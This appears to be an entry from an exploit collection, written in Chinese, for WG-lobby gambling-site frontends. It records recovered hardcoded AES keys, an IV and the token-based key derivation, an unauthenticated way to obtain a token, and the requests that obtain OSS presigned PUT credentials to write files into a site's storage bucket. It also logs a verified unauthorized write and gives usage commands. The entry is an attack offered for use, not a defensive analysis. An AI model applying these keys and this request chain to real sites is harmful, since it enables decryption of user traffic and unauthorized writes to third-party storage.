# WG-lobby（新葡京系）前端加密模型还原 + OSS 预签名写入利用链

- **code**: wg-lobby-新葡京系-前端加密模型还原-oss-预签名写入利用链
- **kind**: exp
- **category**: unauthorized
- **component**: WG-lobby / lobby-web v7.5.x
- **language**: javascript
- **source**: self
- **verified**: 1
- **verified_note**: 实测：21/21 密文解密成功（staffAllV3 12172B）；presigned PUT HTTP 200 ETag=内容 MD5，对象写入 external-upload/finance/upload/user-966152731/75c2f6551903a5db28541ad9bb73c299.png；已记 file-storage 普通档 10 分
- **tags**: WG-lobby,AES,密钥派生,oss,presigned,未授权,反混淆
- **created_at**: 2026-09-27T14:34:57.158Z
- **found_by**: exploit

## 描述

WG-lobby 前端 commonChunk.js 的 LB 加密类：WeakMap 注入静态素材（bf="tgJt2ol!^E)E8(%P"、Ed=iv"5421698523412578"、Ud="thanks,pig4cloud"(ossDecrypt ECB key)、yf=md5），请求/响应体密钥按 token 派生 gk=md5(token+md5(token)).slice(2,18)（k1 分支，k2=md5(token+username).slice(0,16)）。AES-128-CBC，请求体 ZeroPadding、响应 PKCS7；x-data-mode=chipher 时 body 为密文，json_cipher 时 body={encryptString:AES-256-CBC(JSON,key=k$P9m*N2s&V5x!R8z#L4j@F7b^W1t+Q0,iv=16×'0')}。token 可由 getSysInfo 未授权获取（游客/设备 token）。进而调用 /hall/api/finance/upload/presigned/urls 换取 OSS 预签名 PUT 凭证（fileInfos 结构 {fileSize,fileMd5=base64(MD5),fileType=MIME}），写入站点对象存储桶。适用：同源 WG-lobby 多站点（siteCode 参数化）。

## 用法

```
node wg-decrypt.js &lt;cipherFile&gt; [token]；node wg-post.js /api/xxx '{}' chipher；presigned: POST /hall/api/finance/upload/presigned/urls body={deviceFingerprint,fileInfos:[{fileSize,fileMd5:base64(md5),fileType:'image/png'}]} 后 PUT 到 ossHost+path（headers 原样回填）
```
